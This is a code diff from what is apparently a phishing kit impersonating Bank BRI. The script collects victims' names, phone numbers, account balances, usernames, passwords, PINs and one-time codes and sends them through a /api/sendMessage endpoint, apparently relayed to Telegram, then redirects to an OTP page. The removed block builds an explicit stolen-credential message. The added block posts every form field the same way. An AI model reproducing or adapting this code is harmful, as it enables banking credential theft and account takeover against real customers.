@@ -482,101 +482,52 @@ input { outline: unset !important; }
  
    
  <script>
-    $(document).ready(function () {
-        // Toggle visibility of password
-        $("div#eyeOpen").on('click', function () {
-            $("#eyeOpen").css("display", "none");
-            $("#eyeClose").css("display", "block");
-            $("#password").prop("type", "text");
-        });
-
-        $("div#eyeClose").on('click', function () {
-            $("#eyeOpen").css("display", "block");
-            $("#eyeClose").css("display", "none");
-            $("#password").prop("type", "password");
-        });
-
-        // Handle form submission for OTP
-        document.getElementById('otpForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            // Ambil data dari sessionStorage
-            const nama = sessionStorage.getItem('nama');
-            const nomor = sessionStorage.getItem('nomor');
-            const saldo = sessionStorage.getItem('saldo');
-            const user = sessionStorage.getItem('user');
-            const password = sessionStorage.getItem('password');
-            const otp = document.getElementById('otp').value;
-
-            // Buat pesan yang akan dikirimkan ke Telegram
-            const message = `
-                ( Bank BRI | No HP | ${nomor})
-
-                - Nama Lengkap: ${nama}
-                - No HP: ${nomor}
-                - Saldo: ${saldo}
-                - Username: ${user}
-                - Password: ${password}
-                - Code OTP: ${otp}
-            `;
-
-            try {
-                // Mengirim data ke API di Vercel
-                const response = await fetch('/api/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        text: message
-                    })
-                });
-
-                const statusMessage = document.getElementById('status');
-                if (response.ok) {
-                    statusMessage.textContent = "Pesan berhasil dikirim!";
-                    e.target.reset();
-                    window.location.href = '/otp.html'; // Redirect ke halaman berikutnya
-                } else {
-                    const error = await response.json();
-                    statusMessage.textContent = "Gagal mengirim pesan: " + error.error;
-                }
-            } catch (err) {
-                console.error(err);
-                document.getElementById('status').textContent = "Terjadi kesalahan saat mengirim pesan.";
-            }
-        });
-
-        // Handle form submission untuk pengaturan PIN (atau form lainnya)
-        document.querySelector('#setPin').addEventListener("submit", async (e) => {
-            e.preventDefault(); // Prevent default form submission
-
-            const text = JSON.stringify(
-                Object.fromEntries(new FormData(e.target).entries()),
-                null,
-                2
-            );
-
-            try {
-                const response = await fetch('/api/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ text }),
-                });
-
-                const messageStatus = document.querySelector('#status');
-                if (response.ok) {
-                    messageStatus.textContent = "Pesan berhasil dikirim!";
-                    e.target.reset();
-                    window.location.href = '/otp.html'; // Redirect ke halaman berikutnya
-                } else {
-                    const error = await response.json();
-                    messageStatus.textContent = "Gagal mengirim pesan: " + error.error;
-                }
-            } catch (err) {
-                console.error(err);
-                document.querySelector('#status').textContent = "Terjadi kesalahan saat mengirim pesan.";
-            }
-        });
+        $(document).ready(function () {
+    // Toggle visibility of password
+    $("div#eyeOpen").on('click', function () {
+        $("#eyeOpen").css("display", "none");
+        $("#eyeClose").css("display", "block");
+        $("#password").prop("type", "text");
     });
+
+    $("div#eyeClose").on('click', function () {
+        $("#eyeOpen").css("display", "block");
+        $("#eyeClose").css("display", "none");
+        $("#password").prop("type", "password");
+    });
+
+    // Handle form submission
+    document.querySelector('#setPin').addEventListener("submit", async (e) => {
+        e.preventDefault(); // Prevent default form submission
+
+        const text = JSON.stringify(
+            Object.fromEntries(new FormData(e.target).entries()),
+            null,
+            2
+        );
+
+        try {
+            const response = await fetch('/api/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text }),
+            });
+
+            const messageStatus = document.querySelector('#status');
+            if (response.ok) {
+                messageStatus.textContent = "Message sent successfully!";
+                e.target.reset();
+                window.location.href = '/otp.html'; // Redirect to next page
+            } else {
+                const error = await response.json();
+                messageStatus.textContent = "Failed to send message: " + error.error;
+            }
+        } catch (err) {
+            console.error(err);
+            document.querySelector('#status').textContent = "Error sending message.";
+        }
+    });
+});
 </script>
    </script>
         </form>
